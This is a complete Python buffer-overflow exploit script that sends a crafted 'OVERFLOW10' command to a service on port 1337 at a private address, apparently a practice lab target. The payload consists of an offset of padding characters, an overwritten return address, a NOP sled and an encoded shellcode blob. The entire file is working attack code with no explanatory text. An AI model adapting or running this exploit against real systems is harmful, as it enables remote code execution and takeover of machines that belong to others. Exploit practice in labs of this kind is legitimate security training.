#!/usr/bin/env python3

import socket

ip = "10.10.62.141"
port = 1337

prefix = "OVERFLOW10 "
offset = 537 
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xf3\x14\x8c\x30\x83\xee\xfc\xe2\xf4\x0f\xfc\x0e\x30"
"\xf3\x14\xec\xb9\x16\x25\x4c\x54\x78\x44\xbc\xbb\xa1\x18"
"\x07\x62\xe7\x9f\xfe\x18\xfc\xa3\xc6\x16\xc2\xeb\x20\x0c"
"\x92\x68\x8e\x1c\xd3\xd5\x43\x3d\xf2\xd3\x6e\xc2\xa1\x43"
"\x07\x62\xe3\x9f\xc6\x0c\x78\x58\x9d\x48\x10\x5c\x8d\xe1"
"\xa2\x9f\xd5\x10\xf2\xc7\x07\x79\xeb\xf7\xb6\x79\x78\x20"
"\x07\x31\x25\x25\x73\x9c\x32\xdb\x81\x31\x34\x2c\x6c\x45"
"\x05\x17\xf1\xc8\xc8\x69\xa8\x45\x17\x4c\x07\x68\xd7\x15"
"\x5f\x56\x78\x18\xc7\xbb\xab\x08\x8d\xe3\x78\x10\x07\x31"
"\x23\x9d\xc8\x14\xd7\x4f\xd7\x51\xaa\x4e\xdd\xcf\x13\x4b"
"\xd3\x6a\x78\x06\x67\xbd\xae\x7c\xbf\x02\xf3\x14\xe4\x47"
"\x80\x26\xd3\x64\x9b\x58\xfb\x16\xf4\xeb\x59\x88\x63\x15"
"\x8c\x30\xda\xd0\xd8\x60\x9b\x3d\x0c\x5b\xf3\xeb\x59\x60"
"\xa3\x44\xdc\x70\xa3\x54\xdc\x58\x19\x1b\x53\xd0\x0c\xc1"
"\x1b\x5a\xf6\x7c\x86\x3b\xf4\xb7\xe4\x32\xf3\x05\xd0\xb9"
"\x15\x7e\x9c\x66\xa4\x7c\x15\x95\x87\x75\x73\xe5\x76\xd4"
"\xf8\x3c\x0c\x5a\x84\x45\x1f\x7c\x7c\x85\x51\x42\x73\xe5"
"\x9b\x77\xe1\x54\xf3\x9d\x6f\x67\xa4\x43\xbd\xc6\x99\x06"
"\xd5\x66\x11\xe9\xea\xf7\xb7\x30\xb0\x31\xf2\x99\xc8\x14"
"\xe3\xd2\x8c\x74\xa7\x44\xda\x66\xa5\x52\xda\x7e\xa5\x42"
"\xdf\x66\x9b\x6d\x40\x0f\x75\xeb\x59\xb9\x13\x5a\xda\x76"
"\x0c\x24\xe4\x38\x74\x09\xec\xcf\x26\xaf\x6c\x2d\xd9\x1e"
"\xe4\x96\x66\xa9\x11\xcf\x26\x28\x8a\x4c\xf9\x94\x77\xd0"
"\x86\x11\x37\x77\xe0\x66\xe3\x5a\xf3\x47\x73\xe5")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
